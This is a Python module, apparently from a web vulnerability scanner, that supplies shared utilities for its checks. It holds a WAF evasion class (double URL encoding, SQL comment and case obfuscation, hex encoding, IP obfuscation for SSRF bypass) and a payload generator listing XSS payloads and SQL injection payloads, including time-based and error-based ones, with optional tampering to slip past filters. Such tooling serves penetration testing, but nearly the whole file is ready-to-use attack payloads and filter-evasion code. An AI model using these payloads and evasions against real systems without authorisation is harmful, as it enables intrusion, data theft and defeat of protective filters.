"""
Base modules and utilities for checks
This file provides common functionality shared across all checkers
Location: checks/base.py
"""

import re
import random
import urllib.parse
import socket
import struct
from typing import Dict, List, Any, Optional

class WAFEvasion:
    """Advanced WAF Evasion & Payload Tampering Utilities"""
    
    @staticmethod
    def double_url_encode(payload: str) -> str:
        """Applies double URL encoding to bypass basic filters"""
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    @staticmethod
    def sql_comment_obfuscation(payload: str) -> str:
        """Replaces spaces with SQL comments (e.g., ' ' -> '/**/')"""
        return payload.replace(" ", "/**/")
    
    @staticmethod
    def sql_case_variation(payload: str) -> str:
        """Randomizes case for SQL keywords (e.g., SELECT -> SeLeCt)"""
        return "".join(choice.upper() if random.choice([True, False]) else choice.lower() for choice in payload)

    @staticmethod
    def hex_encode_string(payload: str) -> str:
        """Encodes string to hex format (0x...)"""
        return "0x" + payload.encode('utf-8').hex()

    @staticmethod
    def ip_obfuscate(ip_address: str) -> List[str]:
        """Generates multiple obfuscated formats for an IP address (SSRF Evasion)"""
        variations = [ip_address]
        try:
            # Check if it's an IPv4 address
            packed = socket.inet_aton(ip_address)
            unpacked = struct.unpack("!L", packed)[0]
            
            # 1. Decimal / Dword format (http://2130706433)
            variations.append(str(unpacked))
            
            # 2. Hex format (http://0x7f000001)
            variations.append(hex(unpacked))
            
            # 3. Octal format (http://0177.0000.0000.0001)
            parts = ip_address.split('.')
            octal = '.'.join([format(int(part), '04o') for part in parts])
            variations.append(octal)
            
            # 4. Mixed encoding (rare but effective)
            variations.append(f"0x{parts[0]}.{parts[1]}.{parts[2]}.{parts[3]}")
            
        except:
            pass
        return list(set(variations))


class PayloadGenerator:
    """Generates and manages payloads for various vulnerability types"""
    
    @staticmethod
    def generate_xss_payloads(context: str = "html") -> List[str]:
        """Generate XSS payloads based on context"""
        payloads = []
        
        if context in ["html", "all"]:
            payloads.extend([
                '<script>alert(document.domain)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<body onload=alert(1)>',
                '<iframe src="javascript:alert(document.domain)">',
                '<details open ontoggle=alert(1)>',
                '<video><source onerror=alert(1)></video>',
                '<audio src=x onerror=alert(1)>',
                '<form><button formaction="javascript:alert(1)">X</button>',
                '<input onfocus=alert(1) autofocus>',
            ])
        
        if context in ["attribute", "all"]:
            payloads.extend([
                '" onmouseover="alert(1)',
                "' onfocus='alert(1)'",
                ' autofocus onfocus=alert(1)',
                ' onload="alert(1)"',
                ' onerror="alert(1)"',
            ])
            
        if context in ["url", "all"]:
            payloads.extend([
                'javascript:alert(1)',
                'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            ])
            
        return payloads

    @staticmethod
    def generate_sqli_payloads(tamper: bool = False) -> List[str]:
        """Generate SQLi payloads, optionally tampered for evasion"""
        base_payloads = [
            "'",
            "''",
            "`",
            "\"",
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "' AND 1=CAST((SELECT version()) AS INT)--",
            "' OR (SELECT 1 FROM (SELECT SLEEP(5))a)--",
            "' OR SLEEP(5)--",
            "' AND SLEEP(5)--",
            "' AND 1=1--",
            "' AND 1=2--"
        ]
        
        if not tamper:
            return base_payloads
            
        # Apply WAF evasion techniques
        tampered_payloads = []
        for p in base_payloads:
            tampered_payloads.append(p) # Keep original
            
            # Add comment obfuscated version
            if " " in p:
                tampered_payloads.append(WAFEvasion.sql_comment_obfuscation(p))
            
            # Add double encoded version
            tampered_payloads.append(WAFEvasion.double_url_encode(p))
            
        return list(set(tampered_payloads))